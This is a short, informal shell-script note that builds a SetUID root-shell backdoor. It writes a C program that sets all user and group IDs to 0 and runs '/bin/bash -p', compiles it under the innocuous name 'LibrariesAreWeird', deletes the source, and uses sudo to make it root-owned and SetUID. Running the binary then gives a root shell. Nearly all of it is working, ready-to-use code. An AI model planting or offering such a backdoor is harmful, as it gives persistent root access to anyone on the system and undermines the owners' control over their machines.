# LibrariesAreWeird - for once, not a bug!

# First time compiling C ever went well - Bash rules! 
# Also, kinda forgot GNU_SOURCE was a thing, LOLFAO.

cat << 'EOF' > bash.c
#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>

int main() { 
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    setreuid(0, 0);
    setregid(0, 0);
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    
    system("/bin/bash -p"); 
    return 0; 
}
EOF

# Ok, yeah, had to Google gcc -o, forgot it was a thing.

gcc bash.c -o LibrariesAreWeird # Compile, check perms in a sec.
ls -l LibrariesAreWeird # Now we check perms, LOL.

# Delete bash.c, LOL
rm bash.c

# Add SetUID perms - check to verify
sudo chown root:root LibrariesAreWeird
sudo chmod u+s LibrariesAreWeird

# Check again - you should see an in there (SetUID)
ls -l LibrariesAreWeird

# Run the binary, you should get a (root) shell
./LibrariesAreWeird



